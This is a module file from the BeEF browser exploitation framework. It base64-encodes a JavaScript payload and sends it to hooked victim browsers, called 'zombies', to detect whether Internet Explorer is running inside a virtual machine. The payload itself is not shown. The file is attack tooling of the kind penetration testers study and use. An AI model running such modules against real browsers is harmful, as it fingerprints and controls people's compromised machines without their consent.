<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: the following details refer to the source of this port

Dean De Beer
Detecting VMware with JavaScript (or how to waste your time with pointless exercises)
http://carnal0wnage.blogspot.com/2009/04/detecting-vmware-with-javascript-or-how.html

-->

<script>
	Element.Methods.construct_code = function() {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Detect VM</div>
This module will detect if the IE browser is in a VM. This will only work if the browser is configured insecurely.<br>
<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value="send" onClick="javascript:construct_code()"/>
	</form>
</div>

